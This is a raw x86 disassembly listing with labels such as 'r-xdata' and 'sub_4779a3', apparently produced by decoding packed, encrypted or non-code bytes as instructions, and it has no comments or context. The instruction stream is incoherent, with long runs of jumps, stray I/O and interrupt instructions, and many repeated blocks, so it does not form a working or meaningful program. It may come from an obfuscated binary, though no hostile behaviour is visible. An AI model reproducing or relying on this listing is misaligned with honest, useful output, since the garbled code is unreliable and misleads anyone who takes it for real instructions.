and [ edx + 0x7b7b4ce6 ] edx
add [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
jpo r-xdata
sbb eax 0x21c72ef2
adc [ ecx ] ebx
sbb eax 0x21c52ef2
adc [ edi ] ebx
xchg edx eax
dec ecx
jpo r-xdata
jmp r-xdata
add [ edi + 0x74 ] al
jpo r-xdata
popad
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xlat
pushad
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
and al 0x7d
jpo r-xdata
cwde
std
xchg [ ebx + 0x7b ] edi
jpo r-xdata
test [ esi ] cl
jae r-xdata
idiv ah
jmp r-xdata
xchg edx eax
0x137b7b65 0x4996
jge r-xdata
xchg edx eax
add bh [ edx ]
jpo r-xdata
inc [ edi ]
adc [ edx + 0x7b7b60d7 ] 0xeb
jmp r-xdata
jpo r-xdata
shufps xmm3 [ edi + 0x26f0b248 ] 0x8f
dec edx
jpo r-xdata
sub dl dh
pop edi
je r-xdata
xchg [ esp + eax * 4 - 0x64c109d5 ] al
xchg edx eax
pop esi
insd
jpo r-xdata
sub eax [ esi + ecx + 0x7fef673 ]
int 0x54
jpo r-xdata
and ah ch
test [ edx + 0x7b7b84c2 ] al
jpo r-xdata
cld
outsd
r-xdata
cmp edi [ ebx + 0x7b ]
sbb eax 0x929f3ef2
cmp ecx [ edx + 0x7b ]
jpo r-xdata
jpo r-xdata
[ edi ]
clc
mov edi 0x6bbc9263
jpo r-xdata
je r-xdata
jle r-xdata
mov ebx 0x8858ff74
xchg edx eax
xlat
push esp
jpo r-xdata
xchg edx eax
jle r-xdata
mov eax 0x7b7d8992
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
fwait
jmp r-xdata
sbb eax 0x92b52ef2
jpo r-xdata
idiv [ esi ]
jpo r-xdata
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
jmp r-xdata
je r-xdata
jpo r-xdata
test [ esi ] cl
jae r-xdata
je r-xdata
std
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
xchg ebx eax
stosd [ edi ]
jpo r-xdata
std
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
movsb [ edi ] [ esi ]
r-xdata
mov ch 0x92
mov ebp 0x7b6b5f3f
inc edx
pop es
pop edi
dec edi
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jpo r-xdata
fstp [ ebx + edi * 2 ]
jmp r-xdata
jpo r-xdata
mov edx 0xf87b7b64
mov edi 0x407df26f
jl r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
jmp r-xdata
jpo r-xdata
stc
jne r-xdata
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
je r-xdata
test [ 0xffffffff8483f81f ] ch
jmp r-xdata
jpo r-xdata
mov ebx 0x7b3cf092
jpo r-xdata
test [ edx + 0x7b7b51ac ] edx
sbb eax 0x118f3ef2
daa
jmp r-xdata
jmp r-xdata
jpo r-xdata
fwait
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
dec eax
je r-xdata
xchg [ esi ] edi
mov esi 0xeb84848e
jmp r-xdata
jmp r-xdata
mov dl 0xf0
and [ 0x11d526f2 ] bl
xlat
mov edx 0x696a9273
jpo r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
mov esi ebx
fwait
stosd [ edi ]
[ eax - 0x78 ]
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
xchg ebx eax
popfd
aas
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
sbb eax 0x927b41f8
adc [ edx + 0x7b ] 0x7b
and bh dh
mov ebx 0x7b7fff74
jpo r-xdata
jns r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
mov es [ esp + eax * 4 + 0x74ebebeb ]
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
stosd [ edi ]
jmp 0xffffffff9274793d
jmp r-xdata
pop es
pop edi
push edi
inc edx
pop es
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
das
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_4779a3
push cs
cmpsd [ esi ] [ edi ]
test [ edi ] ch
xchg edx eax
xlat
clc
lahf
cmp edx 0xffffff97
out dx eax
jg r-xdata
jmp r-xdata
aad 0x11
jpo r-xdata
xchg edx eax
or [ 0xffffffff92c536f2 ] bl
sbb eax 0x20d726f2
sbb eax 0x11d526f2
jmp r-xdata
jpo r-xdata
xchg edx eax
mov ah 0x76
jpo r-xdata
jpo r-xdata
jmp r-xdata
xlat
adc [ edi ] ebx
cmpsd [ esi ] [ edi ]
push 0x7b
jpo r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
sbb eax 0x21c72ef2
adc [ ecx ] ebx
sbb eax 0x21c52ef2
pop ds
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xor [ ecx + 0x7b ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebp
jpo r-xdata
jmp r-xdata
xchg edx eax
xlat
pushad
jpo r-xdata
jmp r-xdata
push edi
jpo r-xdata
sbb eax 0xfe7b7b67
mov ebx 0x7b63ff74
jpo r-xdata
cmp al 0xfe
mov ebx 0x399dfe74
jpo r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
and al 0x7d
jpo r-xdata
jpo r-xdata
clc
adc [ ebx ] 0x74
stc
push esi
push edi
jpo r-xdata
adc [ edx + edx * 4 ] edx
sbb [ 0x21c52ef2 ] ebx
adc [ ebx - 0x7c ] edi
in eax dx
xlat
xchg ebx eax
lds ecx [ ebp - 0x506d7b7c ]
cmp [ ebx + 0x7b ] edi
std
xchg [ ebx + 0x7b ] edi
jpo r-xdata
test [ esi ] cl
jae r-xdata
idiv ah
jmp r-xdata
fist [ ecx + 0x7b ]
jpo r-xdata
adc al 0x92
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b575efe ]
jpo r-xdata
xchg edx eax
0x137b7b65 0x4996
jge r-xdata
xchg edx eax
add bh [ edx ]
jpo r-xdata
inc [ edi ]
adc [ edx + 0x7b7b60d7 ] 0xeb
jmp r-xdata
mov eax 0x117b7b7b
adc [ eax ] ebx
xchg ebx eax
fdiv [ ebx + edi * 2 ]
jpo r-xdata
jpo r-xdata
cmp [ ebx + 0x28 ] ch
clc
jpo r-xdata
shufps xmm3 [ edi + 0x26f0b248 ] 0x8f
dec edx
jpo r-xdata
sub dl dh
pop edi
je r-xdata
xchg [ esp + eax * 4 - 0x64c109d5 ] al
xchg edx eax
pop esi
insd
jpo r-xdata
sub eax [ esi + ecx + 0x7fef673 ]
int 0x54
jpo r-xdata
and ah ch
test [ edx + 0x7b7b84c2 ] al
jpo r-xdata
cld
mov edi 0x47004277
test [ esi + edi * 8 + 0x5e ] dh
push edi
jpo r-xdata
xchg ebx eax
imul [ ebp + 0x7b ]
outsd
r-xdata
cmp edi [ ebx + 0x7b ]
sbb eax 0x929f3ef2
cmp ecx [ edx + 0x7b ]
jpo r-xdata
jpo r-xdata
[ edi ]
clc
mov edi 0x6bbc9263
jpo r-xdata
je r-xdata
jle r-xdata
mov ebx 0x8858ff74
xchg edx eax
xlat
push esp
jpo r-xdata
je r-xdata
jpo r-xdata
daa
sub edi [ ebx + 0x7b ]
sub eax 0x7b6df793
mov edx 0x692d938b
jpo r-xdata
idiv [ eax ]
imul ebp [ eax ] 0xfffffff8
and [ edx + 0x7b7b4ce6 ] edx
add [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
xchg edx eax
jle r-xdata
mov eax 0x7b7d8992
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
fwait
jmp r-xdata
sbb eax 0x92b52ef2
jpo r-xdata
idiv [ esi ]
jpo r-xdata
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
jmp r-xdata
add [ edi + 0x74 ] al
je r-xdata
jpo r-xdata
test [ esi ] cl
jae r-xdata
je r-xdata
std
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
xchg ebx eax
stosd [ edi ]
jpo r-xdata
std
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
movsb [ edi ] [ esi ]
r-xdata
mov ch 0x92
mov ebp 0x7b6b5f3f
inc edx
pop es
pop edi
dec edi
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jpo r-xdata
fstp [ ebx + edi * 2 ]
jmp r-xdata
jpo r-xdata
mov edx 0xf87b7b64
mov edi 0x407df26f
jl r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
jmp r-xdata
jpo r-xdata
stc
jne r-xdata
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
je r-xdata
test [ 0xffffffff8483f81f ] ch
jmp r-xdata
jpo r-xdata
mov ebx 0x7b3cf092
jpo r-xdata
test [ edx + 0x7b7b51ac ] edx
sbb eax 0x118f3ef2
daa
jmp r-xdata
jmp r-xdata
jpo r-xdata
fwait
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
dec eax
je r-xdata
xchg [ esi ] edi
mov esi 0xeb84848e
jmp r-xdata
jmp r-xdata
mov dl 0xf0
and [ 0x11d526f2 ] bl
xlat
mov edx 0x696a9273
jpo r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
mov esi ebx
fwait
stosd [ edi ]
[ eax - 0x78 ]
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
xchg ebx eax
popfd
aas
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
sbb eax 0x927b41f8
adc [ edx + 0x7b ] 0x7b
and bh dh
mov ebx 0x7b7fff74
jpo r-xdata
jns r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
mov es [ esp + eax * 4 + 0x74ebebeb ]
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
stosd [ edi ]
jmp 0xffffffff9274793d
jmp r-xdata
pop es
pop edi
push edi
inc edx
pop es
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
das
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477af3
push cs
cmpsd [ esi ] [ edi ]
test [ esi ] cl
xchg edi eax
sub al 0x92
inc eax
je r-xdata
xor [ edx + 0x7b ] edx
jpo r-xdata
cmp [ ebx + 0x7b ] bh
xchg edi eax
sub esi eax
mov ebp 0x7b664693
jpo r-xdata
jmp r-xdata
xchg edx eax
les ebp [ ebx ]
jpo r-xdata
mov dl 0xf0
jmp [ esi ]
sub eax 0x7b347e93
jpo r-xdata
mov [ 0xfffffffff21d1811 ] al
push cs
ja r-xdata
or [ 0xffffffff92c536f2 ] bl
cmpsd [ esi ] [ edi ]
push 0x7b
jpo r-xdata
sbb eax 0x20d726f2
sbb eax 0x11d526f2
jmp r-xdata
push cs
xlat
jpo r-xdata
mov edx 0xf87b7b64
mov edi 0x407df26f
mov eax 0x7b7d8992
jpo r-xdata
jmp r-xdata
jae r-xdata
test [ esi ] cl
je r-xdata
and [ 0x11d526f2 ] bl
xlat
jl r-xdata
jpo r-xdata
mov edx 0x696a9273
jpo r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
idiv ah
xchg ebx eax
popfd
aas
jpo r-xdata
jmp r-xdata
sbb eax 0x21c72ef2
adc [ ecx ] ebx
sbb eax 0x21c52ef2
adc [ edx + edx * 4 ] edx
fist [ ecx + 0x7b ]
jpo r-xdata
adc [ edx + 0x7b7b60d7 ] 0xeb
jmp r-xdata
sbb eax 0x927b41f8
adc [ edx + 0x7b ] 0x7b
and bh dh
mov ebx 0x7b7fff74
jpo r-xdata
pop ds
mov dl 0xb8
jmp r-xdata
and ah ch
test [ edx + 0x7b7b84c2 ] al
jpo r-xdata
cld
stosd [ edi ]
jmp 0xffffffff9274793d
jmp r-xdata
pop es
pop edi
push edi
inc edx
pop es
pop edi
je r-xdata
je r-xdata
jle r-xdata
sbb eax 0x92b52ef2
jpo r-xdata
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
movsb [ edi ] [ esi ]
r-xdata
mov ch 0x92
mov ebp 0x7b6b5f3f
inc edx
pop es
pop edi
dec edi
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
je r-xdata
int 0x54
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
jmp r-xdata
dec eax
mov ebx 0x8858ff74
xchg edx eax
xlat
push esp
jpo r-xdata
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
[ eax - 0x78 ]
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
jpo r-xdata
fwait
idiv [ esi ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jpo r-xdata
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ 0xffffffff8483f81f ] ch
jmp r-xdata
das
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
je r-xdata
xchg [ esi ] edi
mov esi 0xeb84848e
jmp r-xdata
jns r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
cmp eax 0x25f8747d
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
jpo r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
stc
jne r-xdata
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
stosd [ edi ]
mov esi ebx
fwait
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
mov es [ esp + eax * 4 + 0x74ebebeb ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477cc3
push ds
and ebx [ 0x48af3ef2 ]
mov ebx 0xb52ef21d
xchg edx eax
movsb [ edi ] [ esi ]
r-xdata
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
jmp r-xdata
dec eax
[ eax - 0x78 ]
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
jpo r-xdata
fwait
idiv [ esi ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
das
jpo r-xdata
